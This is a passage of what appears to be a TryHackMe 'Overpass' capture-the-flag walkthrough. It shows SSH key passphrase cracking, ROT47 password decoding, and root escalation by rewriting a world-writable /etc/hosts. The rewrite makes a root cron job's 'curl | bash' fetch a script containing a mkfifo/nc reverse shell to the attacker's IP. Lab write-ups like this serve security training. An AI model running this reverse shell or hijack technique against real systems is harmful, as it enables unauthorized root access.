Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>KDF/cipher <span style=color:#f92672>[</span>0<span style=color:#f92672>=</span>MD5/AES 1<span style=color:#f92672>=</span>MD5/3DES 2<span style=color:#f92672>=</span>Bcrypt/AES<span style=color:#f92672>])</span> is <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>for</span> all loaded hashes
Cost <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>for</span> all loaded hashes
Will run <span style=color:#ae81ff>4</span> OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
james13          <span style=color:#f92672>(</span>id_rsa.enc<span style=color:#f92672>)</span>
Warning: Only <span style=color:#ae81ff>2</span> candidates left, minimum <span style=color:#ae81ff>4</span> needed <span style=color:#66d9ef>for</span> performance.
1g 0:00:00:05 DONE <span style=color:#f92672>(</span>2021-04-20 13:46<span style=color:#f92672>)</span> 0.1893g/s 2716Kp/s 2716Kc/s 2716KC/sa6_123..*7¬°Vamos!
Session completed
</code></pre></div><br><p>Awesome, we&rsquo;ve the ssh <code>private key file's password</code>. Let&rsquo;s <strong>SSH</strong>! üòé</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Overpass<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> ssh <span style=color:#f92672>-</span>i id_rsa<span style=color:#f92672>.</span><span style=color:#a6e22e>enc</span> james<span style=color:#a6e22e>@10.10.219.14</span>          
The authenticity of host <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>219</span><span style=color:#f92672>.</span><span style=color:#a6e22e>14</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>219</span><span style=color:#f92672>.</span><span style=color:#a6e22e>14</span><span style=color:#f92672>)</span><span style=color:#960050;background-color:#1e0010>&#39;</span> can<span style=color:#960050;background-color:#1e0010>&#39;</span>t be established<span style=color:#f92672>.</span>
ECDSA key fingerprint <span style=color:#66d9ef>is</span> SHA256<span style=color:#f92672>:</span><span style=color:#ae81ff>4</span>P0PNh<span style=color:#f92672>/</span>u8bKjshfc6DBYwWnjk1Txh5laY<span style=color:#f92672>/</span>WbVPrCUdY<span style=color:#f92672>.</span>
Are you sure you want to <span style=color:#66d9ef>continue</span> <span style=color:#a6e22e>connecting</span> <span style=color:#f92672>(</span>yes<span style=color:#f92672>/</span>no<span style=color:#f92672>/[</span>fingerprint<span style=color:#f92672>])?</span> yes
Warning: Permanently added <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>219</span><span style=color:#f92672>.</span><span style=color:#a6e22e>14</span><span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span> to the list of known hosts<span style=color:#f92672>.</span>
Enter passphrase <span style=color:#66d9ef>for</span> key <span style=color:#960050;background-color:#1e0010>&#39;</span>id_rsa<span style=color:#f92672>.</span><span style=color:#a6e22e>enc</span><span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>:</span> 
Welcome to Ubuntu <span style=color:#ae81ff>18.04</span><span style=color:#f92672>.</span><span style=color:#a6e22e>4</span> <span style=color:#a6e22e>LTS</span> <span style=color:#f92672>(</span>GNU<span style=color:#f92672>/</span>Linux <span style=color:#ae81ff>4.15</span><span style=color:#f92672>.</span><span style=color:#a6e22e>0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>108</span><span style=color:#f92672>-</span>generic x86_64<span style=color:#f92672>)</span>

 <span style=color:#f92672>*</span> Documentation<span style=color:#f92672>:</span>  https<span style=color:#f92672>:</span><span style=color:#75715e>//help.ubuntu.com
</span><span style=color:#75715e></span> <span style=color:#f92672>*</span> Management<span style=color:#f92672>:</span>     https<span style=color:#f92672>:</span><span style=color:#75715e>//landscape.canonical.com
</span><span style=color:#75715e></span> <span style=color:#f92672>*</span> Support<span style=color:#f92672>:</span>        https<span style=color:#f92672>:</span><span style=color:#75715e>//ubuntu.com/advantage
</span><span style=color:#75715e></span>
  System information as of Tue Apr <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>08</span><span style=color:#f92672>:</span><span style=color:#ae81ff>47</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> UTC <span style=color:#ae81ff>2021</span>

  System load<span style=color:#f92672>:</span>  <span style=color:#ae81ff>0.0</span>                Processes<span style=color:#f92672>:</span>           <span style=color:#ae81ff>87</span>
  Usage of <span style=color:#f92672>/:</span>   <span style=color:#ae81ff>22.3</span><span style=color:#f92672>%</span> of <span style=color:#ae81ff>18.57</span>GB   Users logged <span style=color:#66d9ef>in</span><span style=color:#f92672>:</span>     <span style=color:#ae81ff>0</span>
  Memory usage<span style=color:#f92672>:</span> <span style=color:#ae81ff>15</span><span style=color:#f92672>%</span>                IP address <span style=color:#66d9ef>for</span> eth0<span style=color:#f92672>:</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>219</span><span style=color:#f92672>.</span><span style=color:#a6e22e>14</span>
  Swap usage<span style=color:#f92672>:</span>   <span style=color:#ae81ff>0</span><span style=color:#f92672>%</span>

<span style=color:#ae81ff>47</span> packages can be updated<span style=color:#f92672>.</span>
<span style=color:#ae81ff>0</span> updates are security updates<span style=color:#f92672>.</span>

Last login<span style=color:#f92672>:</span> Sat Jun <span style=color:#ae81ff>27</span> <span style=color:#ae81ff>04</span><span style=color:#f92672>:</span><span style=color:#ae81ff>45</span><span style=color:#f92672>:</span><span style=color:#ae81ff>40</span> <span style=color:#ae81ff>2020</span> from <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#a6e22e>170</span><span style=color:#f92672>.</span><span style=color:#a6e22e>1</span>
james<span style=color:#a6e22e>@overpass</span><span style=color:#f92672>-</span>prod<span style=color:#f92672>:~</span>$ id
uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span><span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span><span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span><span style=color:#f92672>(</span>james<span style=color:#f92672>)</span>
james<span style=color:#a6e22e>@overpass</span><span style=color:#f92672>-</span>prod<span style=color:#f92672>:~</span>$ 
james<span style=color:#a6e22e>@overpass</span><span style=color:#f92672>-</span>prod<span style=color:#f92672>:~</span>$ wc <span style=color:#f92672>-</span>c user<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> 
<span style=color:#ae81ff>38</span> user<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
</code></pre></div><h2 id=privileges-escalation>Privileges Escalation<a hidden class=anchor aria-hidden=true href=#privileges-escalation>#</a></h2><p>We&rsquo;ve a <code>todo.txt</code> file in the <em>home directory</em> of <code>james</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>james<span style=color:#a6e22e>@overpass</span><span style=color:#f92672>-</span>prod<span style=color:#f92672>:~</span>$ cat todo<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> 
To Do<span style=color:#f92672>:</span>
<span style=color:#f92672>&gt;</span> Update Overpass<span style=color:#960050;background-color:#1e0010>&#39;</span> Encryption<span style=color:#f92672>,</span> Muirland has been complaining that it<span style=color:#960050;background-color:#1e0010>&#39;</span>s not strong enough
<span style=color:#f92672>&gt;</span> Write down my password somewhere on a sticky note so that I don<span style=color:#960050;background-color:#1e0010>&#39;</span>t forget it<span style=color:#f92672>.</span>
  Wait<span style=color:#f92672>,</span> we make a password manager<span style=color:#f92672>.</span> Why don<span style=color:#960050;background-color:#1e0010>&#39;</span>t I just use that<span style=color:#f92672>?</span>
<span style=color:#f92672>&gt;</span> Test Overpass <span style=color:#66d9ef>for</span> macOS<span style=color:#f92672>,</span> it builds fine but I<span style=color:#960050;background-color:#1e0010>&#39;</span>m not sure it actually works
<span style=color:#f92672>&gt;</span> Ask Paradox how he got the automated build script working and where the builds go<span style=color:#f92672>.</span>
  They<span style=color:#960050;background-color:#1e0010>&#39;</span>re not updating on the website
</code></pre></div><br><p>Let&rsquo;s check the <code>.overpass</code> file:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@overpass-prod:~$ cat .overpass <span style=color:#f92672>&amp;&amp;</span> echo
,LQ?2&gt;6QiQ$JDE6&gt;Q<span style=color:#f92672>[</span>QA2DDQiQD2J5C2H?<span style=color:#f92672>=</span>J:?8A:4EFC6QN.
</code></pre></div><br><p>Awesome, let&rsquo;s use <code>decoder</code> to <strong>decode the encoded</strong> string!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>                                                                                                                                                                              <span style=color:#f92672>[</span>3/55<span style=color:#f92672>]</span>
‚îî‚îÄ# pip3 install decoder                                                                                 
Requirement already satisfied: decoder in /usr/local/lib/python3.9/dist-packages <span style=color:#f92672>(</span>0.5<span style=color:#f92672>)</span>
Requirement already satisfied: termcolor in /usr/lib/python3/dist-packages <span style=color:#f92672>(</span>from decoder<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.1.0<span style=color:#f92672>)</span>
Requirement already satisfied: pycipher in /usr/local/lib/python3.9/dist-packages <span style=color:#f92672>(</span>from decoder<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>0.5.2<span style=color:#f92672>)</span>

‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>
‚îî‚îÄ# decoder -s <span style=color:#e6db74>&#39;,LQ?2&gt;6QiQ$JDE6&gt;Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.&#39;</span>
________                          .___            
<span style=color:#ae81ff>\_</span>_____ <span style=color:#ae81ff>\ </span>  ____   ____  ____   __| _/___________ 
 |    |  <span style=color:#ae81ff>\_</span>/ __ <span style=color:#ae81ff>\_</span>/ ___<span style=color:#ae81ff>\/</span>  _ <span style=color:#ae81ff>\ </span>/ __ |/ __ <span style=color:#ae81ff>\_</span>  __ <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span> |    <span style=color:#e6db74>`</span>   <span style=color:#ae81ff>\ </span> ___/<span style=color:#ae81ff>\ </span> <span style=color:#ae81ff>\_</span>_<span style=color:#f92672>(</span>  &lt;_&gt; <span style=color:#f92672>)</span> /_/ <span style=color:#ae81ff>\ </span> ___/|  | <span style=color:#ae81ff>\/</span>
/_______  /<span style=color:#ae81ff>\_</span>__  &gt;<span style=color:#ae81ff>\_</span>__  &gt;____/<span style=color:#ae81ff>\_</span>___ |<span style=color:#ae81ff>\_</span>__  &gt;__|   
        <span style=color:#ae81ff>\/</span>     <span style=color:#ae81ff>\/</span>     <span style=color:#ae81ff>\/</span>           <span style=color:#ae81ff>\/</span>    <span style=color:#ae81ff>\/</span>       

              Automate the Manual :<span style=color:#f92672>)</span>

---
<span style=color:#f92672>[</span><span style=color:#75715e>#] Provided string: ,LQ?2&gt;6QiQ$JDE6&gt;Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.</span>
---

-------------------------------------------------------

<span style=color:#f92672>[</span>%<span style=color:#f92672>]</span> Common Encodings
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> AtBash decoded: OJJRJQWVJJZWWJRJWQXSQZVUXJM

-------------------------------------------------------

<span style=color:#f92672>[</span>%<span style=color:#f92672>]</span> Rot Encodings <span style=color:#f92672>(</span><span style=color:#ae81ff>13</span> - 47<span style=color:#f92672>)</span>

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> ROT13 decoded: ,YD?2&gt;6DvD$WQR6&gt;D<span style=color:#f92672>[</span>DN2QQDvDQ2W5P2U?<span style=color:#f92672>=</span>W:?8N:4RSP6DA.
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> ROT47 decoded: <span style=color:#f92672>[{</span><span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;System&#34;</span>,<span style=color:#e6db74>&#34;pass&#34;</span>:<span style=color:#e6db74>&#34;saydrawnlyingpicture&#34;</span><span style=color:#f92672>}]</span>

-------------------------------------------------------

<span style=color:#f92672>[</span>%<span style=color:#f92672>]</span> Ceaser Cipher <span style=color:#f92672>(</span>with shifts <span style=color:#ae81ff>0</span> - 9<span style=color:#f92672>)</span>

<span style=color:#f92672>[</span>&amp;<span style=color:#f92672>]</span> Shift: <span style=color:#ae81ff>0</span> Decoded: ,LQ?2&gt;6QiQ$JDE6&gt;Q<span style=color:#f92672>[</span>QA2DDQiQD2J5C2H?<span style=color:#f92672>=</span>J:?8A:4EFC6QN.
...

-------------------------------------------------------
</code></pre></div><br><p><strong>We get the decoded string:</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>[{<span style=color:#f92672>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;System&#34;</span>,<span style=color:#f92672>&#34;pass&#34;</span>:<span style=color:#e6db74>&#34;saydrawnlyingpicture&#34;</span>}]
</code></pre></div><br><p>Let&rsquo;s try this <code>password</code> as different users (from <code>/etc/passwd</code>):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@overpass-prod:~$ su - root
Password: 
su: Authentication failure
james@overpass-prod:~$ su - tryhackme
Password: 
su: Authentication failure
james@overpass-prod:~$ su - james
Password: 
james@overpass-prod:~$
</code></pre></div><br><p>The password only worked fine with <code>james</code>. Let&rsquo;s see if we can run any binaries as user james.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@overpass-prod:~$ sudo -l 
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> james: 
Sorry, user james may not run sudo on overpass-prod.
</code></pre></div><br><p>Sadloif, let&rsquo;s run <code>linpeas</code> to do local enumeration.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@overpass-prod:~$ wget http://10.17.0.120/linpeas.sh <span style=color:#f92672>&amp;&amp;</span> chmod +x linpeas.sh
--2021-04-20 08:53:23--  http://10.17.0.120/linpeas.sh
Connecting to 10.17.0.120:80... connected.                                                               
HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
Length: <span style=color:#ae81ff>328992</span> <span style=color:#f92672>(</span>321K<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>text/x-sh<span style=color:#f92672>]</span>
Saving to: ‚Äòlinpeas.sh‚Äô                       

linpeas.sh                                           100%<span style=color:#f92672>[=====================================================================================================================</span>&gt;<span style=color:#f92672>]</span> 321.28K   267KB/s    in 1.2s    

2021-04-20 08:53:24 <span style=color:#f92672>(</span><span style=color:#ae81ff>267</span> KB/s<span style=color:#f92672>)</span> - ‚Äòlinpeas.sh‚Äô saved <span style=color:#f92672>[</span>328992/328992<span style=color:#f92672>]</span>
</code></pre></div><br><p>Going through the <em>results of linpeas</em>, we can see that there&rsquo;s a <code>cronjob</code> running as <code>root</code> user <code>every minute</code>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># /etc/crontab: system-wide crontab</span>
<span style=color:#75715e># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
<span style=color:#75715e># command to install the new version when you edit this file</span>
<span style=color:#75715e># and files in /etc/cron.d. These files also have username fields,</span>
<span style=color:#75715e># that none of the other crontabs do.</span>

SHELL<span style=color:#f92672>=</span>/bin/sh
PATH<span style=color:#f92672>=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span style=color:#75715e># m h dom mon dow user  command</span>
<span style=color:#ae81ff>17</span> *    * * *   root    cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.hourly
<span style=color:#ae81ff>25</span> <span style=color:#ae81ff>6</span>    * * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.daily <span style=color:#f92672>)</span>
<span style=color:#ae81ff>47</span> <span style=color:#ae81ff>6</span>    * * <span style=color:#ae81ff>7</span>   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style=color:#f92672>)</span>
<span style=color:#ae81ff>52</span> <span style=color:#ae81ff>6</span>    <span style=color:#ae81ff>1</span> * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style=color:#f92672>)</span>
<span style=color:#75715e># Update builds from latest code</span>
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
</code></pre></div><br><p>Checking <code>/etc/hosts</code> <strong>overpass.thm</strong> points to our <a href=http://localhost>localhost</a> server.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
</code></pre></div><br><p>Going further through <code>linpeas</code> results, we can see that <code>/etc/hosts</code> is writeable by us.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Interesting writable files owned by me or writable by everyone <span style=color:#f92672>(</span>not in Home<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>max 500<span style=color:#f92672>)</span>                                                                                                                         
<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                                     
/dev/mqueue                                                                                                                                                                                                        
/dev/shm                                                                                                                                                                                                           
/etc/hosts                                                                                                                                                                                                         
/home/james                                                                                                                                                                                                        
/run/lock                                                                                                                                                                                                          
/run/screen                                                                                                                                                                                                        
/run/screen/S-james                                                                                                                                                                                                
/run/user/1001                                                                                                                                                                                                     
/run/user/1001/gnupg                                                                                                                                                                                               
/run/user/1001/systemd                                                                                                                                                                                             
/tmp                                                                                                                                                                                                               
/tmp/.ICE-unix                                                                                                                                                                                                     
/tmp/.Test-unix                                                                                                                                                                                                    
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
<span style=color:#75715e>#)You_can_write_even_more_files_inside_last_directory</span>

/var/crash
/var/tmp

--

james@overpass-prod:~$ ls -la /etc/hosts 
-rw-rw-rw- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>250</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> /etc/hosts
</code></pre></div><br><p>Rest is easy, let&rsquo;s change this <code>host</code> to our <code>IP</code>, and make it <code>fetch</code> the <code>.sh</code> file. You can either use <code>python</code> or <code>apache server</code>, since my <code>apache server</code> is already running on <code>port 80</code>, I&rsquo;ll be using that.</p><p>The file <code>/etc/hosts</code> then looks like:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.17.0.120 overpass.thm
</code></pre></div><br><p>Let&rsquo;s now create directories on our server for it to fetch:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/var/www/html<span style=color:#f92672>]</span>
‚îî‚îÄ# mkdir -p downloads/src/
                                                                                                                                                                                                                   
‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/var/www/html<span style=color:#f92672>]</span>
‚îî‚îÄ# cd downloads/src 
                                                                                                                                                                                                                   
‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/var/www/html/downloads/src<span style=color:#f92672>]</span>
‚îî‚îÄ# cat &gt; buildscript.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.17.0.120 <span style=color:#ae81ff>4444</span> &gt;/tmp/f
</code></pre></div><br><p>Let&rsquo;s start our listener now! üï∫</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/var/www/html/downloads/src<span style=color:#f92672>]</span>
‚îî‚îÄ# nc -nlvp <span style=color:#ae81ff>4444</span>                   
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> ...
connect to <span style=color:#f92672>[</span>10.17.0.120<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.219.14<span style=color:#f92672>]</span> <span style=color:#ae81ff>60760</span>
bash: cannot set terminal process group <span style=color:#f92672>(</span>20179<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
bash: no job control in this shell
root@overpass-prod:~# id
id
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
root@overpass-prod:~# ls -al 
ls -al 
total <span style=color:#ae81ff>56</span>
drwx------  <span style=color:#ae81ff>8</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> .
drwxr-xr-x <span style=color:#ae81ff>23</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> ..
lrwxrwxrwx  <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>9</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> .bash_history -&gt; /dev/null
-rw-------  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>3106</span> Apr  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2018</span> .bashrc
drwx------  <span style=color:#ae81ff>3</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> .cache
drwx------  <span style=color:#ae81ff>3</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> .local
-rw-------  <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>184</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> .profile
drwx------  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> .ssh
-rw-r--r--  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>11662</span> Apr <span style=color:#ae81ff>20</span> 09:03 buildStatus
drwx------  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> builds
drwxr-xr-x  <span style=color:#ae81ff>4</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> go
-rw-------  <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>38</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> root.txt
drwx------  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> src
root@overpass-prod:~# wc -c root.txt
wc -c root.txt
<span style=color:#ae81ff>38</span> root.txt
</code></pre></div><br><p>Cool, <strong>we&rsquo;re root</strong>!</p><h3 id=bonus-challenge>Bonus Challenge:<a hidden class=anchor aria-hidden=true href=#bonus-challenge>#</a></h3><p>We now have to find the <code>coupon</code> hid by the author for <code>THM subscription</code> (<em>it has been taken over already as told in the challenge</em>) but let&rsquo;s search it anyways.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@overpass-prod:~# find / -name <span style=color:#e6db74>&#34;.overpass&#34;</span> 2&gt;/dev/null
/home/tryhackme/.overpass
/home/james/.overpass
</code></pre></div><br><p>Let&rsquo;s check <code>/home/tryhackme/.overpass</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@overpass-prod:~# cat /home/tryhackme/.overpass <span style=color:#f92672>&amp;&amp;</span> echo
,LQ?2&gt;6QiQ%CJw24&lt;|<span style=color:#ae81ff>6</span> $F3D4C:AE:@? r@56Q<span style=color:#f92672>[</span>QA2DDQiQ8&gt;%sJ<span style=color:#f92672>=</span>QN.
</code></pre></div><br><p><strong>Decoded:</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>
‚îî‚îÄ# decoder -s <span style=color:#e6db74>&#39;,LQ?2&gt;6QiQ%CJw24&lt;|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8&gt;%sJ=QN.&#39;</span>
________                          .___            
<span style=color:#ae81ff>\_</span>_____ <span style=color:#ae81ff>\ </span>  ____   ____  ____   __| _/___________ 
 |    |  <span style=color:#ae81ff>\_</span>/ __ <span style=color:#ae81ff>\_</span>/ ___<span style=color:#ae81ff>\/</span>  _ <span style=color:#ae81ff>\ </span>/ __ |/ __ <span style=color:#ae81ff>\_</span>  __ <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span> |    <span style=color:#e6db74>`</span>   <span style=color:#ae81ff>\ </span> ___/<span style=color:#ae81ff>\ </span> <span style=color:#ae81ff>\_</span>_<span style=color:#f92672>(</span>  &lt;_&gt; <span style=color:#f92672>)</span> /_/ <span style=color:#ae81ff>\ </span> ___/|  | <span style=color:#ae81ff>\/</span>
/_______  /<span style=color:#ae81ff>\_</span>__  &gt;<span style=color:#ae81ff>\_</span>__  &gt;____/<span style=color:#ae81ff>\_</span>___ |<span style=color:#ae81ff>\_</span>__  &gt;__|   
        <span style=color:#ae81ff>\/</span>     <span style=color:#ae81ff>\/</span>     <span style=color:#ae81ff>\/</span>           <span style=color:#ae81ff>\/</span>    <span style=color:#ae81ff>\/</span>       

              Automate the Manual :<span style=color:#f92672>)</span>

---
<span style=color:#f92672>[</span><span style=color:#75715e>#] Provided string: ,LQ?2&gt;6QiQ%CJw24&lt;|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8&gt;%sJ=QN.</span>
---

-------------------------------------------------------

<span style=color:#f92672>[</span>%<span style=color:#f92672>]</span> Common Encodings
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> AtBash decoded: OJJRJXQDUWXZVIJJZWWJRJHQJM
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Morse decoded:    

-------------------------------------------------------

<span style=color:#f92672>[</span>%<span style=color:#f92672>]</span> Rot Encodings <span style=color:#f92672>(</span><span style=color:#ae81ff>13</span> - 47<span style=color:#f92672>)</span>

